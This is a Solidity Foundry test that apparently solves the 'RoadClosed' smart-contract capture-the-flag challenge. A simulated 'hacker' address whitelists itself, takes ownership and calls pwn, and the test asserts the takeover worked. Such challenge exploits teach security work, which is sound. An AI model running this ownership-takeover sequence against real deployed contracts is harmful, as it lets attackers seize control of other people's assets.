// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {RoadClosed} from "../src/RoadClosed.sol";

contract RoadClosedExtended is RoadClosed {
    function getOwner() external returns (address) {
        return owner;
    }
}

contract RoadClosedTest is Test {
    address hacker = makeAddr("hacker");
    RoadClosedExtended private challenge;

    function setUp() external {
        challenge = new RoadClosedExtended();
    }

    function test_hack() external {
        vm.startPrank(hacker);

        challenge.addToWhitelist(hacker);
        challenge.changeOwner(hacker);
        challenge.pwn(hacker);

        vm.stopPrank();

        assertEq(challenge.getOwner(), hacker);
        assertTrue(challenge.isHacked());
    }
}
